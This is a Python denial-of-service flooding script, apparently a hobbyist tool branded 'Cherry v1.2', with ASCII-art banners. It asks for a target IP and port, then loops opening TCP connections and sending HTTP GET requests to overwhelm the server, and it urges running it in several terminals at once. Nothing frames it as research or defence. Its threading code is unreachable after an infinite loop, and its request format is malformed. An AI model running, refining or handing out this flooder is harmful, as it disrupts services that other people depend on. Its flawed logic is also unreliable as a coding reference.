#!/usr/bin/python3

# coded by SYNDCAKE
# contact me @YourAnonSynd on twitter
# run this in multiple terminals to maximize strength

from urllib import parse
import time
import sys
import requests
import socket
import threading

print("                                                     ")
print("                     __    _____                             ")
print("                   _/_ \  /_____`.__                    ")
print("               _,.'_/ / \/`._   `.__\                         ")
print("              /_ /__.`  |    `----,__\                              ")
print("             /__.'      |                                ")
print("                        \                                ")
print("                       / \                               ")
print("                      /   '\                              ")
print("              _______/      \                                    ")
print("            ,'    ###',      \______                             ")
print("           /        ###\    ,'    ##',                       ")
print("          |          ###|  /       ###\                  ")
print("          |            #| |          ##|                   ")
print("           \           /  |           #|                    ")
print("            ',_______,'    \          /                          ")
print("                            ',______,'                   ")
print("    _________ __                                        ")
print("   /         |  |                                      ")
print("  |      ____|  |___  ______ _ ____ _ ____    ___                           ")
print("  |     /    |      \/      \ '    | '    |  /  /               ")
print("  |     \____|   _   |   -   |  ___|   ___|\/  /                        ")
print("  |          |  | |  |    __/  |   |  |   \   /                  ")
print("   \_________|__| |__|______|__|   |__|   /  /                                 ")
print("                                         /__/         ")
print("<<<<<<<<<<<<<<<<< made by SYNDCAKE >>>>>>>>>>>>>>>>                                            ")
print("                       1.2.0                                                       ")
print("                  -> expect us <-                                                   ")
print("<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>                                                    ")

#asks user for target information
target = input("[~] Enter Target IP Address -> ")
port = int(input("[~] Enter Target Port To Attack -> "))

#connects to the target ip and floods it
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates a TCP socket
        s.connect((target, port)) #connects to the target
        msg = ("GET /%s HTTP/1.1\nHost: %s\n\n") % (target, port) #sends a message to the host, clogging up the server
        byt = msg.encode()
        s.send(byt)
        s.shutdown(socket.SHUT_RDWR)
        s.close()

        print("[+] Initialized Attack On " + target + ", Port " + str(port) + " | Attack Using Cherry v.1.2")
    all_threads = []
    for i in range(10000000000000):
        thread = threading.Thread(target=attack)
        thread.start()
        all_threads.append(thread)

        time.sleep(0.00000001)

    for current_thread in all_threads:
        current_thread.join()

attack()
